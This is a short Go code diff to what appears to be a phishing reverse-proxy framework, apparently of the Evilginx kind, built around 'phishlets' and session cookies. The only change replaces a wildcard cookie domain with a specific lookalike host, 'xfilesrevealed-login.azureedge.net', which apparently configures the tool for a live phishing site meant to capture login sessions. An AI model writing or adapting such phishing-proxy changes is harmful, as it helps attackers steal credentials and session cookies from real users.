@@ -894,7 +894,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
 						Value:   ps.SessionId,
 						Path:    "/",
-						Domain:  "*.azureedge.net",
+						Domain:  "xfilesrevealed-login.azureedge.net",
 						Expires: time.Now().Add(60 * time.Minute),
 					}
 				}
